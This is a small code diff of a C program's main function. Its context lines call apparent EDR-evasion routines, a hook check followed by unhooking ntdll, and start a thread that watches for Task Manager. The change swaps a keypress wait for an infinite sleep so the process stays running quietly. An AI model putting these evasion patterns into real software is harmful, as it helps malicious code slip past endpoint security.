@@ -36,6 +36,9 @@ int main(VOID)
 //	printf("[+] Allocated at: %p\n", base);
 //}
 
+
+	
+
 	if (!EdrHookerCheck()) {
 		unhook_Ntdll();
 	}
@@ -48,7 +51,6 @@ int main(VOID)
 			CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WatchForTaskmgr, NULL, 0, NULL);
 		}
 
-	// keep alive
-	getchar();
+	Sleep(INFINITE);
 	return 0;
 }
